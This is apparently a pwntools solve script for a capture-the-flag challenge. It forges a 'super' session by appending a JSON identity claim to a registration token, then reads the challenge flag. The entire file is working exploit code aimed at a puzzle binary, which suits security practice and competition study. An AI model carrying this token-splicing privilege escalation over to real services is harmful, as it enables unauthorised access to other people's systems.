from pwn import *

host = "xn--sg8h.shellweplayaga.me"
port = 10001

if args.REMOTE:
	r = remote('localhost', '1337')
else:
	r = process('./🌌')


def sendsignal(data):
	global r
	#print("Sending ", data.decode())
	r.sendline(data)

def rcvsignal():
	global r
	res = r.recvuntil(b"[$Signal]").decode()
	#print(res)
	if "Deadend" in res:
		r.interactive()
	return res

def authenticate_as_super():
	sendsignal(f"reg|ù".encode())
	res = rcvsignal()
	#print(res)
	session_token = res.split("[Register][Token]")[-1].split("[$Token][$Register]")[0]
	data = b"auth|" + session_token.encode() + b'{"ident":"super"}'
	#print("Sending ", data.decode())
	sendsignal(data)
	r.recvuntil(b"authenticated")
	print('[+] Authenticated as super')

def index():
	sendsignal(b"index|")
	res = rcvsignal()
	#print(res)

if __name__ == "__main__":
	authenticate_as_super()
	r.sendlineafter(b'[Enquiry]', b'flag1|')

	r.recvuntil(b'[Flag1]')
	flag = r.recvuntil(b'[$Flag1]', drop=True).decode()
	print(flag)
	r.close()
